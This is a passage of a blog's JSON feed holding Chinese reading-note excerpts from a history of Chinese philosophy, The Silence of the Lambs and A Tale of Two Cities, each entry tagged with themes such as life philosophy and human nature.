“形象之内”，即限于实际世界。他们见到了实际，要表达它并不困难：他们虽然使用名来指实，可是并不自觉它们是名。</p>\n<h3 id=\"4-54\"><a class=\"markdownIt-Anchor\" href=\"#4-54\">#</a> 4-54</h3>\n<p>思索名，就是思索思想。它是对于思想的思想，所以是更高层次的思想。</p>\n<p>有了天、地和万物，接着就有天、地和万物之名。这就是老子说的 “始制有名”。但是道是无名，同时一切有名都是无名而来。</p>\n<p>因为道无名，所以不可言说。但是我们还是希望对于道有所言说，只好勉强给它某种代号。所以我们称它为道，其实道根本不是名。但是我们称道为道，意思并不是说，它有任何这样的名的属性。它纯粹是一个代号，用中国哲学常用的话说，道是无名之名。</p>\n<p>既然 “道” 是万物之所从生者，它必然不是万物中一物。因为它若是万物中一物，它就不能同时是万物之所从生者。每类物都有一名，但是 “道” 本身不是一物，所以他是 “无名、朴”。</p>\n<p>万物的存在蕴含 “有” 的存在。老子说 “天下万物生于有，有生于无”。</p>\n<p>虽然万物都永远可变，在变，可是万物变化所遵循的规律本身不变。</p>\n<p>任何事物的某些性质如果向极端发展，这些性质一定会转变它们的反面。</p>\n<p>划不出这样的绝对界限，可以适合一切事物，一切情况。就人类活动而论，一个人前进的极限是相对于他的主观感觉和客观环境而存在的。</p>\n<p>想要得些东西，就要从其反面开始；想要保持什么东西，就要在其中容纳一些与它相反的东西。</p>\n<p>人们丧失了原有的 “德”，是因为它们欲望太多、知识太多。人们要满足欲望、是为了寻求快乐。但是他们力求满足的欲望太多，就得到相反的结果。</p>\n<p>知识本身也是欲望的对象。它也使人能够对于欲望的对象知道得多些，以此作为手段去取得这些对象。它是欲望的主人，又是欲望的奴仆。随着知识的增加，人们就不再安于知足，知止的地位了。</p>\n<p>道家认为，天下大乱，不是因为有许多事情还没有做，而是因为已经做的事情太多了。</p>\n<p>圣王首先要消除乱天下的一切根源，然后他就无为而治。无为，而无不为。</p>\n<h3 id=\"4-55\"><a class=\"markdownIt-Anchor\" href=\"#4-55\">#</a> 4-55</h3>\n<p>圣人愚是一个自觉的修养过程的结果。它比知识更高、比知识更多，而不是更少。</p>\n<p>自由发展我们的自然天性，可以使我们得到一种相对幸福；绝对幸福是通过对事物的自然本性有更高一层的理解而得到的。</p>\n<p>可是只要它们都做到了它们能做的、爱做的，他们都同样的幸福。所以万物的自然本性没有绝对的同，也不必有绝对的同。</p>\n<p>只需要顺乎人自身内在的自然本性，就得到这样的相对幸福。这是每个人能够做到的。庄子的政治、社会哲学，目的正在于为每个人求得这样的相对幸福。任何政治、社会哲学所希望做到的，充其量都不过如此吧。</p>\n<p>感情造成的精神痛苦，有时候正与肉刑一样的剧烈。但是，人利用理解的作用，可以削弱感情。心灵理解到万物的必然性，理解的范围有多大，也就在多大的范围内有更大的力量控制后果，而不为它们受苦。</p>\n<p>无知的人不仅在各方面受到外部原因的扰乱，从未享受灵魂的真正和平，而且过着对上帝、对万物似乎一概无知的生活，活着也是受苦，一旦不再受苦了，也就不再存在了。</p>\n<p>另一方面，有知的人，在他有知的范围内，简直可以不动心，而且由于理解他自己、上帝、万物都有一定的永恒的必然性，他也就永远存在，永远享受灵魂的和平。</p>\n<p>假使我跟你辩，你胜了我，我不胜你，这就能证明你的意见一定正确吗？你胜了我，我不胜你，这就能证明我的意见一定正确吗？或者你我中间，有一个人的意见是正确的，或者都是正确的，或者都是不正确的，我跟你都不能决定。没人能决定！</p>\n<p>事物永远在变化，而且有许多方面。所以对于同一事物可以有许多观点。只要我们这样说，就是假定有一个站得更高的观点。如果我们接受了这个假定，就没有必要自己来决定孰是孰非。这个论证的问题在于它自身。</p>\n<p>从道的观点看事物的人，好像是站在圆心上。他理解在圆周上运动着的一切，但是他自己则不参加这些运动。这不是由于他无所作为，听天由命，而是因为他已经超越有限，从一个更高的观点看事物。</p>\n<h3 id=\"4-56\"><a class=\"markdownIt-Anchor\" href=\"#4-56\">#</a> 4-56</h3>\n<p>从道的观点看，万物虽不相同，可是都统一为一个整体，即 “通为一”。</p>\n<p>他已经忘了事物的一切区别，甚至忘了他自己生活中的一切区别。他的经验中只有混沌的 “一”，他就生活在其中。</p>\n<p>知识的任务就是做出区别：知道一个事物就是知道它与其他事物的区别，所以弃知就意味着忘记这些区别。一切区别一旦都忘记了，就只剩下了混沌的整体，就是大一。</p>\n<p>圣人并不是保持原始的无知状态的人。他们有一个时期具有丰富的知识，能做出各种区别，只是后来忘记了它们。他们与原始的无知的人之间区别很大，就和勇敢的人失去知觉而不畏惧的人之间的区别一样大。</p>\n<p>功利哲学即承认人类服从此二威权之事实，而以为之哲学的基础。此哲学的目的，在以理性、法律维持幸福。</p>\n<p>边沁把善恶归结为快乐，苦痛的问题。照他的说法，道德的目的就是 “最大多数的最大幸福”。</p>\n<p>荀子的论点：“人之性，恶；其善者，伪也”。伪，就是人为。</p>\n<p>人们必须一起生活，为了在一起生活而无争，各人在满足自己的欲望方面必须接受一定的限制。礼的功能就是确定这种限制。有礼，才有道德。遵礼而行就是道德，违礼而行就是不道德。</p>\n<p>人应该有社会关系和礼，因为只有它们才使人异于禽兽。从这个方面的论证来看，人要有道德，并不是因为人无法避开它，而是因为人应当具备它。</p>\n<p>知识是重要的，可是也不能光靠知识生活，还需要情感的满足。在决定对死者的态度时，不能不考虑理智和情感这两个方面。照儒家解释的，丧祭之礼正好做到了这一点。</p>\n<p>我们对待死者，不可以只按我们所知道的，或者只按我们需要的去对待。应当采取中间的方式，即按所知道的，又按所希望的去对待。这种方式就是对待死者，要像他还活着那样。</p>\n<h3 id=\"4-57\"><a class=\"markdownIt-Anchor\" href=\"#4-57\">#</a> 4-57</h3>\n<p>为求雨而祭祀，为做出重大决定而占卜，都不是要表示我们的忧虑，如此而已。</p>\n<p>他们虽然分属名家，但是同意这一点，就是人类黄金时代在过去，不在将来，自从黄金时代过去后，历史的运动一直是逐步退化的运动，因此拯救人类不在于创新，而在于复古。</p>\n<p>照法家看，他们的治国之道，真正是即使是一个人也能掌握。君主只能把赏罚大权握在手里。这样进行统治，就是无为而无不为。</p>\n<p>转化、改变是指宇宙的各个事物：简单和不变，是指事物的道，或遵循的原理。事物变而道不变。事物是复杂的，而道是容易和简单的。</p>\n<p>每个事物在一个意义上是阳，在另一个意义上又是阴，这是要根据它与其他事物的关系而定。</p>\n<p>要取得胜利，就一定要注意，不要过分的胜利；要避免丧失某物，就一定要在此物中补充一些与他相仿的东西。</p>\n<p>吃喝是人类普通而平常的活动，它们普通而平常，正由于他们重要，没有人能够没有它。人伦和道德也是如此，它们在有些人看来简直普通而平常的没有价值，可是它们之所以如此，正由于他们重要，没有人能够离开它。</p>\n<p>固然没有人能够完全不顾人伦而在社会中生活，可是同时也只有极少数的人能够完全符合这些人伦提出的条件。教的作用，就是使人把事实上已经不同程度的在做的事做完全。</p>\n<p>一个人若是明白了日常生活中普通而平常活动的一切意义，诸如饮食人伦的意义，他就已经是圣人。一个人若是把他说明白的完全做到了，他也是圣人。如果做不到也就不可能完全明白其意义。如果不完全明白其意义，也就不可能完全做到。</p>\n<p>假使真的没有文明和文化，宇宙就好像是个未成品，宇宙本身也会感到不完全的痛苦吧。</p>\n<p>每一物需要其他的每一物，但是每一物的存在都是为了它自己，而不是为其它任何一物。</p>\n<p>存在于宇宙的每一事物，需要整个宇宙为其存在的必要条件，可是它的存在并不是直接由任何另外某物造成的。只要一定的条件或环境出现了，一定的物就必然产生。但是这并不是说，他们是任何名义的造物主或个体造成的。换句话说，物是一般的条件造成的，不是任何另外特殊的物造成的。</p>\n<h3 id=\"4-58\"><a class=\"markdownIt-Anchor\" href=\"#4-58\">#</a> 4-58</h3>\n<p>新的制度和新的道德应当是自生的，这才自然。新与旧彼此不同是由于它们的时代不同。它们各自适合各自时代的需要，所以彼此并无优劣而言。</p>\n<p>模仿是无用的，没有结果的，有害的。唯一合理的生活方式是 “任我”，即为 “无为”。</p>\n<p>一个人若能真正 “任我”，“毁其所贵”，这就意味着他已经能够去掉向郭所说的 “偏尚之累”。换句话说，他已经能够懂得 “齐物” 即万物同等的道理，能够从更高的观点看万物了。他已经登上了通向混沌一体没有差别的境界康庄大道。</p>\n<p>如果某物只在其有限的范围内自得其乐、则其乐也一定是有限的。所以在这些故事 后面讲了一个关于真正独立的人的故事。他超越有限，而与无限合一，从而享受无限而绝对的幸福。</p>\n<p>人活着，应当任我，不应当从人。就是说，人活着应当任从他自己的理性或冲动，不应当遵从当时的风俗和习惯。</p>\n<p>佛学认为，宇宙的一切现象，或者更确切的说，一个有情物的宇宙的一切现象。都是他心的表现。不论何时，他动，他说，以至于他想，这就是他的心做了点什么，这点什么一定产生了他的结果，无论在多么遥远的将来。</p>\n<p>业是因、报是果。一个人的存在，就是一连串的因果造成的。</p>\n<p>宇宙的一切事物都是心的表现，所以是虚幻的，暂时的，可是无知的个人还是渴求他们，迷恋他们。这种根本无知，就是无 “明”。无明生贪嗔痴脸；由于对生的贪恋，个人就陷入永恒的生死轮回，万劫不复。</p>\n<p>普通意义的道理，即 “俗谛”；有高级意义的道理，即 “真谛”。不仅有这两种道理，而且都存在于不同的层次上。低一层次的真谛，在高一层次上只是俗谛。</p>\n<p>一切都否定了，包括否定这个 “否定一切”，就可以达到庄子哲学中相同的境界，就是忘记一切，连这个 “忘记一切” 也忘了。因此，照它说的达到第三层次的真谛，就什么都不用说了。</p>\n<p>万物每刻都在变化。在任何特定的时刻存在的任何事物，实际上是这个时刻的新事物，用过去存在的这个事物不是同一个事物。</p>\n<h3 id=\"4-59\"><a class=\"markdownIt-Anchor\" href=\"#4-59\">#</a> 4-59</h3>\n<p>要知某一事物，就要选出这个事物的某一性质。以此性质作为知的对象，但是圣智是要知 “无”，“它” 超乎形象，没有性质。所以 “无” 根本不能成为 “知” 的对象。要知 “无”，只用与 “无” 统一。这种 “无” 统一的状态，就叫做 “涅槃”。</p>\n<p>第一义不可说，因为对于 “无” 什么也不能说。如果把它叫做 “心” 或别的什么名字，那么就立即给它一个定义，因而给它了一种限制。</p>\n<p>为了成佛最好的修行方法，是不做任何修行，就是不修之修。有修之修，是有心的作为，就是有为。不造新业，并不是不做任何事，而是做事以无心。因此最好的修行办法就是以无心做事。</p>\n<p>这种修行方法的目的，不在于做事以求好的结果。不管这些结果本身可能有多么好。毋宁说它的目的，在于做事不引起任何结果。一个人的行为不引起任何结果，那么在他以前积累的业消除净尽以后，他就能超脱生死轮回。</p>\n<p>以无心做事，就是自然地做事，自然地生活。</p>\n<p>修行的道路，这是要充分相信自己。其他一切放下，不必于日常行事外，别有用功，别有修行。这就是不用功的用功，也就是禅师们所说的不修之修。</p>\n<p>在开始的时候，需要努力，其目的是无需努力；需要有心，情目的是无心；正像为了忘记先需要记住必须忘记。可是后来时刻一到，就必须抛弃努力。达到无需努力；抛弃有心，达到无心；正像终于忘记了记住必须忘记 。</p>\n<p>不修之需本身是一种修，正如不知之知本身也是一种知。这样的知，不同于原来的无明；不修之修，也不同于原来的自然。因为原来的无名和自然，都是自然的产物；而不知之知，不修之修都是精神的创造。</p>\n<p>在禅人看来，圣人的生活，无异于平常人的生活；圣人做的事，也就是平常人做的事。它自迷而悟，从犯入圣。入圣之后，又必须从圣再入凡。百尺竿头象征着悟的成就的顶点。更进一步，意味既悟之后，圣人还有别的事要做。可是他所要做的，仍然不过是平常的事。</p>\n<p>佛必须在社会和人士之外提高精神修养，圣人则必须在社会关系之内提高精神修养。</p>\n<h3 id=\"4-60\"><a class=\"markdownIt-Anchor\" href=\"#4-60\">#</a> 4-60</h3>\n<p>他做每个人应该做的事，但是由于他的见解，他做的事获得了新的意义。新儒家建立了一个观点，从这个观点看来，原先儒家评定为道德的行为，都获得了更高的价值，即超道德的价值。</p>\n<p>在程灏看来，人必须首先觉解他与万物本来是合一的道理。然后他需要做的一切，不过是把这个道理放在心中，做起事来诚实地聚精会神地遵循着这个道理，这样的功夫积累多了，他就会真正感觉到他与万物合一。</p>\n<p>有某物，必有此物之理，但是有某理，则可以有，也可以没有相应的物。</p>\n<p>全部的理都永恒在那里，无论实际世界有没有他们的实例，也无论人是否知道它们，它们还是在那里。</p>\n<p>他或喜或怒的时候，那也不过是外界当喜当怒之物在他心中引起相应的情感罢了。他的心像一面镜子，可以照出任何东西。这种态度产生的结果是，只要对象消逝了，他所引起的情感也随之消逝了。</p>\n<p>一个人，也和其他事物一样，是具体世界中具体的特殊的产物。因此我们所说的人性，也就不过是各个人所禀受的人之理。这里的理，并不是普遍性的理，只是个人禀受的理。</p>\n<p>良知所直接知道的是我们意志或思想的伦理方面。它只能告诉我们应该做什么，但是不能告诉我们怎么做。</p>\n<p>研究哲学，无所谓完不完。若要他完，一句话就能完，不要它完，就永远不会完。</p>\n<p>“理” 自成是绝对的，永恒的，但是我们所知道的 “理”，作为科学的定律和理论。则是相对的，可变的。</p>\n<p>哲学，特别是 “形上学”，是这样一门知识，在其发展中，最终成为” 不知之知 “。</p>\n<p>哲学的发展，使它最终达到超越经验的” 某物 “。在这个” 某物 “中存在着从逻辑上说不可感只可思的东西。</p>\n<p>人与其他动物的不同，在于人做某事时，他了解在他在做什么，并且自觉地在做，这是这种觉解，使他正在做的对于他有了意义。他做各种事，有各种意义，各种意义合成了一个整体，就构成了他的人生境界。</p>\n<h3 id=\"4-61\"><a class=\"markdownIt-Anchor\" href=\"#4-61\">#</a> 4-61</h3>\n<p>他不可能表演奇迹，也不需要表演奇迹，他这个只是平常人做的事，但是由于有高度的觉解，他所做的是对于他就有不同的意义。换句话说，他是在觉悟状态做他所做的事，别人是在无明状态做他们所做的事。</p>\n<p>在使用负的方法之前，哲学家与学哲学的学生必须通过正的方法；在达到哲学的单纯性之前，他必须通过哲学的复杂性。</p>\n<p>人必须先说很多话，然后保持静默。</p>\n",
            "tags": [
                "人生哲学",
                "道德"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/49%E3%80%8A%E6%B2%89%E9%BB%98%E7%9A%84%E7%BE%94%E7%BE%8A%E3%80%8B%E5%86%AF%E7%8E%9B%E5%A3%AB%C2%B7%E5%93%88%E9%87%8C%E6%96%AF/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/49%E3%80%8A%E6%B2%89%E9%BB%98%E7%9A%84%E7%BE%94%E7%BE%8A%E3%80%8B%E5%86%AF%E7%8E%9B%E5%A3%AB%C2%B7%E5%93%88%E9%87%8C%E6%96%AF/",
            "title": "《沉默的羔羊》冯玛士·哈里斯",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>我不知道我的父母为什么不早点把我弄死，要让我长大了来愚弄他们。</p>\n<h3 id=\"4-81\"><a class=\"markdownIt-Anchor\" href=\"#4-81\">#</a> 4-81</h3>\n<p>给每个人都套上道德尊严的裤子 – 从来就没有任何事可以说是谁的过错。</p>\n<p>如果镀金的桌子项链已变得很俗艳，那接下来还会不会有别的什么同样也变得俗艳呢？</p>\n<p>你可绝非平庸之辈，你只是害怕做一个平常的人。</p>\n<p>我们人口中的一些人没有脑子，永远在无休止无规则地瞎闹，仿佛在做布朗运动。</p>\n<p>可现在这么说了，倒又让他觉得虚假空洞，所幸没有人听到。</p>\n<h3 id=\"4-82\"><a class=\"markdownIt-Anchor\" href=\"#4-82\">#</a> 4-82</h3>\n<p>我所知道的一样也不顶用，我只想得到我所追寻的。</p>\n<p>我知道他们绝对绝对不会让我活着出去。我想要的是一片风景。我想要一扇窗户，可以看到一棵树，甚至水。</p>\n<p>这只昆虫长长的，形状像一具木乃伊。它包裹在一个半透明的外壳里，轮廓外形大致像一具石棺。</p>\n<p>有一种蛾，实际上还不止一种，是靠吃眼泪而生活的。</p>\n<p>找遍这个荒诞的世界，这半个此刻已是黑夜的世界，我一定要将那个靠吃眼泪活着的东西捕获！</p>\n<p>在她的生活里，她曾见到过一些骇人听闻的事情，世上的东西伸手就被毁。</p>\n<p>学校的日常生活也没有减轻她的痛苦。整天她都有这样的感觉：事情已经发生过了，就在这地平线以上。她仿佛听到大片隐隐约约的声音，说出事了；那声音犹如来自远处的一个露天体育场。</p>\n<p>他每天都面临着可怕的下场，我们没有任何更可怕的结局可以拿来威胁他。</p>\n<p>她的恐惧紧挨在她脖子后头，如呼吸般直往她身上呼，别的近一点的记忆也在她一旁翻滚着。</p>\n<p>虽然暴露了黑暗，却仍有一些东西是有持久价值的，闪光的，值得保存的。此刻她有意识地来回忆这些东西，发现自己能将她们当护身法宝一样地紧紧抓住。</p>\n<p>两人在过道上相对而视，周围是寂静无声的骨头。</p>\n<p>我们已经没有任何东西可以用来威胁他 – 他马桶上的座圈没了，书没了。他已经被清洗一空。</p>\n<p>他就是靠这种东西活着的。这是他的营养。</p>\n<p>车内的平静与安宁，这件使命井然有序的进行，这些都是以高昂的代价买得来的。</p>\n<p>他的行为究竟真的是在愚蠢地企图模仿脂粉气十足的男人，还是一种充满恶意的嘲讽，乍一接触很难讲，而他接触的人都是那种点头之交。</p>\n<p>苦痛的枯寂生活，一笑则是满口的黄牙，除口臭用的是低廉的蹩脚货。</p>\n<h3 id=\"4-83\"><a class=\"markdownIt-Anchor\" href=\"#4-83\">#</a> 4-83</h3>\n<p>生活复杂多变，哪怕是书本能抓得住的。愤怒表现为欲望，狼创说成了荨麻疹。</p>\n<p>在这绝对的黑暗中，就是眨眼睛弄出的那点细微声，她都能听得到。</p>\n<p>无论吓唬还是友好，都不能束缚他的思想，正如弥尔顿的思想不能为物理学所束缚的一样。他的脑子是自由的。</p>\n<p>我不知道我的父母为什么不早点把我弄死，要让我长大了来愚弄他们。</p>\n<p>我知道你害怕的是什么，不是痛苦，不是孤独。你无法忍受的是没有尊严，这方面你像只猫。</p>\n<p>我这儿可不会为了什么国家利益而来迫害那些持不同生活态度的人。</p>\n<p>时间在一点点吞噬着我们，我们来不及了。</p>\n<p>我可以另找个能够获得同样结果的法子，并按照这法子走过场做做样子。</p>\n<p>得用无聊单调来威胁他，他怕的只有这个，粗暴对待他不管用。</p>\n<p>她决意要让自己忙碌，忙碌，一直到能冷静下来为止。</p>\n<p>愤怒与挫折只会妨碍你的思维。浪费时机愚蠢行事带给你的是最坏的结果。</p>\n<p>我要你把目光顶住值得追求的目标、唯一重要的就是这个。为得到一点信息你忙活着，付出了代价，也得到了，现在我们就要来利用他。这信息与奇尔顿搅和这事儿之前相比完全一样有用，要没价值也是一样的没有价值。只是我们再也不能获得更多的信息了，很可能就是这样。</p>\n<p>内部勾心斗角浪费时间，你派一名稚嫩的新手带着份虚假的承诺去找莱克特。不要拖拉费时的繁琐手续，不搞人身攻击，不对其信用提出疑问。</p>\n<p>钻营名利为了些许优惠条件浪费的够多了，我不想再浪费时间了。</p>\n<p>漫不在意可能是逃避痛苦的一种策略，而这却往往被误解为浅薄和冷漠。</p>\n<p>她恍恍惚惚，觉得这世上的事情她根本一件都没有搞懂。</p>\n<p>他是墓地里的一只貂。他活在胸腔的深处，心中已满是枯叶。</p>\n<p>凯瑟琳・马丁再也不会看到太阳了，太阳是一床火，她信仰的神已葬身其中。</p>\n<p>可惜你现在只得卑贱地迎合他人，可能的话就舔几滴眼泪吃吃。</p>\n<p>当你偶然闪现一下还能根据上下文摸清事情的来龙去脉时，我却又忘记你们这代人原来是文盲。</p>\n<h3 id=\"4-84\"><a class=\"markdownIt-Anchor\" href=\"#4-84\">#</a> 4-84</h3>\n<p>活着的最后一天，还在拉一部满载着孩子的小车，后来在睡眠中死去了。</p>\n<p>我醒来时听到羔羊在叫，我在黑暗中醒来，羔羊在厉声地叫。</p>\n<p>没有一个人形在移动，纹身的，做成木乃伊的，缠足的，都没有动弹一下。</p>\n<p>你到明天一觉醒来，脑子里满满当当却又一无所知，星期五本该收获了，可你的东西却还没有种下去。</p>\n<p>他站在窗口，仰望着空空的东方。他并不在等待黎明，东方不过是窗户的朝向罢了。</p>\n<p>他怕别人在他身上看到某种庸俗的东西，某种卑贱的东西，某种形同窃贼的东西。</p>\n<p>族中有许多人在苏格兰被剥夺的一无所有，在爱尔兰受饥饿被迫离开故土，因此有意去冒险。史达琳家族的不少人就是给耗尽了生气，他们拖着沉重的步伐，奔走在肮脏窄小的洞穴一般居所的最底层。</p>\n<p>在所有的那些岁月里，史达琳没别的地方可去，生活就是上学读书，在考试中与人竞争便是她的武器。</p>\n<p>离成功这么近，却只能在最后这无足轻重的事情上搭上点手。</p>\n<p>你知道他会对你下手的，正如他会对别的任何一个人下手一样。</p>\n<p>要获得神圣的宁静，你得一次又一次的去争取，因为鞭策你前进的是困苦，看到困苦，困苦就不会有尽头，永远也不会有尽头。</p>\n<p>他睡得很沉、很甜，因为羔羊已经安静。</p>\n",
            "tags": [
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/44%E3%80%8A%E5%8F%8C%E5%9F%8E%E8%AE%B0%E3%80%8B%E6%9F%A5%E5%B0%94%E6%96%AF%C2%B7%E7%8B%84%E6%9B%B4%E6%96%AF/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/44%E3%80%8A%E5%8F%8C%E5%9F%8E%E8%AE%B0%E3%80%8B%E6%9F%A5%E5%B0%94%E6%96%AF%C2%B7%E7%8B%84%E6%9B%B4%E6%96%AF/",
            "title": "《双城记》查尔斯·狄更斯",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>不论前面遇到什么情况，他都只能一路走到底。</p>\n<h3 id=\"4-40\"><a class=\"markdownIt-Anchor\" href=\"#4-40\">#</a> 4-40</h3>\n<p>我的朋友去世了，我的邻人去世了，我的爱人、我的情之所钟也去世了；那藏在每个人心中的秘密，也就被永远牢牢地封存了，而我也将我心中的秘密一直带进我的坟墓。</p>\n<p>在我走过的这个城市的任何墓地里，在我看来，有哪位长眠者内心深处的奥秘，比那些忙忙碌碌的居民要更加神秘莫测？而在那些居民看来，又有哪位长眠者比我更神秘莫测呢？</p>\n<p>感情！我没有时间、没有机会顾及感情。我把我的整个一生，都耗费在了开动一部巨大的赚钱机器上了。</p>\n<p>现在去打听他的真实情况，不仅无益，反而有害，要去追求这些年他是无人过问还是被人有意长期囚禁，也是有益无害的。现在，任何的刨根问底，都不仅无益，反而无害，因为这是很危险的。</p>\n<p>街道总是被愁云惨雾笼罩，对这儿来说，这种凄惨的情景，比阳光灿烂更加自然和谐。</p>\n<p>一切看得见的东西，都带着凄楚的目光，看着这些脸带病容的人。可是在他们走投无路的神色中，还是流露出一种困兽犹斗的情绪。虽然他们无精打采、骨瘦如柴，他们当中仍然不乏冒着怒火的眼睛，不乏因强忍紧闭得发白的嘴唇，也不乏自己被纹或用作绞人的绞索似的紧锁的双眉。</p>\n<p>我们生活的虽然是个美好的世界，可是这是可能的，还有许许多多这样的事情都是可能的，不但可能，而且已经有了。</p>\n<p>这声音像是许久以前发出声音的最后微弱无力的回音。它已经完全丧失了人类声音的活力和生气，使人感到仿佛是一度娇艳的色彩消退成了一点污痕。</p>\n<p>那双干瘪凹陷的眼睛里，既无兴趣也无好奇，只有一种机械呆板的直觉。</p>\n<p>他经常说完话就陷入茫然状态，要把他从茫然中唤醒，或者说像是千方百计地想要留住一个弥留的人的灵魂，希望他能最后道出某些隐情。</p>\n<p>这家银行和这个国家及其相似，子民们只要一提出建议，想改进一下那些早就不得人心但却偏受尊重的法律和陈规陋习，就会被剥夺继承权。</p>\n<h3 id=\"4-41\"><a class=\"markdownIt-Anchor\" href=\"#4-41\">#</a> 4-41</h3>\n<p>那注定要被残忍的开膛剁割的躯体是人们看热闹的目标，这即将被屠杀、被剁成几块的不朽的生灵，引起了人们的快感。不管这些形形色色的看容怎样想方设法、自欺欺人，把这种兴趣说得多么冠冕堂皇，从根本上讲，这和妖怪吃人的性质是一样的。</p>\n<p>要是征服想利用最庸俗的民族排外心理和恐惧心理来树立威信，那结果只会适得其反，暴露出政府的弱点。</p>\n<p>我是个失意的苦工，我不关心世上的任何人，世上也没有任何人关心我。</p>\n<p>就是在那会儿，我也老给别人做作业，很少做自己的。</p>\n<p>他富有才华，情感高尚，却没有施展才华，流露情感的机会，不能有所作为，也无力谋取自己的幸福。他深知自己的症结所在，却听天由命，任凭自己年复一年的虚度光阴，消耗殆尽。</p>\n<p>或许，还能看到巨大的人流猛冲直闯，狂啸怒吼着，气势汹汹地朝他们扑过来。</p>\n<p>有对政事一窍不通的文职官员，有庸俗透顶、色彩迷迷、胡说八道，生活放荡的无耻教士；所有这些人全都名不符实，但个个谎话连篇，装出称职的样子。他们或近或远统统是大人圈子里的人，因而全都安排了有油水的公职；诸如此类例子，真是不胜枚举。</p>\n<p>靠治疗根本不存在的疾病的美味补药发了大财的一生，在大人的客厅里对着那帮显贵的病人献着谄笑。还有在大人的招待会上逢人便喋喋不休的向人硬灌蛊惑人心的废话的谋士，他们能为国家的弊端想出种种纠正方法，却从来不去认真地想法做一点事情，根除哪怕一桩罪恶行径。</p>\n<p>应声前迎的人，是何等的俯身低首，何等的卑躬屈膝，何等的阿谀奉承，何等的奴颜婢膝，何等的寡廉鲜耻！全身心都在顶礼膜拜。</p>\n<p>即使在这个聋子的城市，哑了的时代里，有时也还能听到一些怨言。但是他们只能把着当成耳边风，谁也不会认真对待这种事情，因此，在这种事情上，倒霉的小老百姓也像对所有别的事情一样，只好尽自己所能来躲避这种人为的灾祸了。</p>\n<h3 id=\"4-42\"><a class=\"markdownIt-Anchor\" href=\"#4-42\">#</a> 4-42</h3>\n<p>这些平民百姓就是在这样的淫威下过日子的。多年来的惨苦经历告诉他们，这种人能够凭借法律手段，乃至超出法律的手段，对他们作出怎样的事来。因而，他们一言不发，手一动不动，连眼睛也没有抬起来。</p>\n<p>我为了实现这个目标，遇到了意想不到的极大危险，但这是个神圣的目标，哪怕它把我引向死亡，我也希望它能一直支持着我。</p>\n<p>受冷落也有好处，在孤独的环境中使人更有利于冷静的思考问题，这对你的命运的影响，远比你自己凭性子乱闯有益。</p>\n<p>有那么多人在追求这些东西，可是相形之下如愿以偿的人却少之又少。</p>\n<p>在我们周围的整个乡间，我们看到的面孔，没有一张有丝毫的敬意，有的只是阴沉沉的恐惧和仆从。</p>\n<p>这里表面看起来挺富丽堂皇，可要是把他放到光天化日之下，从里到位仔细查看一番，就会发现，它不过是一座摇摇欲坠的破塔而已，它是由奢靡浪费管理不善、巧取豪夺、累累债务、典当抵押、迫害压榨、饥寒交迫、受苦受难堆砌而成的。</p>\n<p>你根本没有这种感情，所以你那么说我也就不必恼火了。就跟一个根本不懂绘画的人批评我的一副绘画，一个根本不懂音乐的人批评我的一首曲子一样，我一点也不会恼火。</p>\n<p>在他愿意说话的时候，经常是妙语连珠，可他似乎永远被一种无所用心的神情所笼罩，很少有让他内心的光亮冲破这层阴霾闪现的时候。</p>\n<p>正如你所知道，他是个自暴自弃，虚度年华、嗜酒成性的可怜虫。</p>\n<p>我有了一些模模糊糊的想法，要重新振作，要重新开始，克服懒散和放浪形骸的恶习，重整旗鼓。然而，这是一场梦，完全是一场梦，到头来一无所有，只留下做梦人还在原地打转。</p>\n<p>最后，有消息说警卫队就要来了，人们才开始慢慢散去。警卫队也许真的来了，也许根本就没来，乌合之众往往就这样。</p>\n<p>这些傻瓜什么也不懂。他们轻贱你的生命，还想让你或者像你一样的成百上千个还不如他们的一匹马或是一条狗的这些人死去，他们只懂得你们表面上跟他们说的话。那就让这些话再骗他们一会儿吧。</p>\n<h3 id=\"4-43\"><a class=\"markdownIt-Anchor\" href=\"#4-43\">#</a> 4-43</h3>\n<p>他们游游荡荡地走了，带着一副穷极无聊、漫无目的、出于偶然的样子，十分自然而又无可怀疑。</p>\n<p>在这儿，所有我们想的都是怎么活命。这就是我们想的事情，这就足够让我们从早想到晚，根本不用麻烦我们的脑子去关照别的事了。</p>\n<p>他们织没用；不过，机械性的工作是用来作为吃喝这种行为的机械性替换的；双手动作是代替嘴的咀嚼和肠胃的消化的；如果那瘦骨嶙峋的手指停下不动了，那么腹中就会更加饥肠辘辘。</p>\n<p>这夜色朝坐在那里织了又织的女人逼的已经很近了，从而她们，就是她们本身，也逼拢在一架如今尚未造成的机器周围，她们得坐在那儿，一边织了又织，一边还在数着那一颗一颗落下来的人头。</p>\n<p>他显然一直在竭力克制着，可是一旦不需要再克制，某种精神上的反常现象便有可能在他身上出现了。他的脸上又露出了昔日那种惊恐不安和茫然不知所措的神情。</p>\n<p>这种恐惧心理，对于患者是一种多么沉重的思想负担，而且对他来说，要强使自己说出那压在心头的心事，哪怕是说一句话，都是非常困难的。几乎可以说是不可能的。</p>\n<p>很可能长期以来，他心中就潜藏着一种恐惧感，害怕联想起那些事情，比如说，怕在某种情况下引起他的这种回想。他曾努力想要使自己事先做好准备，但是毫无用处。也许正是因为他竭力想做好准备，结果反倒使他更加承受不了这个打击。</p>\n<p>不管从他的性格还是命运看，现在恐怕都没有什么挽回的希望了。</p>\n<p>总之，一切全凭他们那变化无常的判断或毫无根据的想象，全凭是否最有利于这个 “自由、平等、博爱、要不毋宁死的统一不可分割的新生共和国” 而定。</p>\n<p>不论前面遇到什么情况，他都只能一路走到底。</p>\n<h3 id=\"4-44\"><a class=\"markdownIt-Anchor\" href=\"#4-44\">#</a> 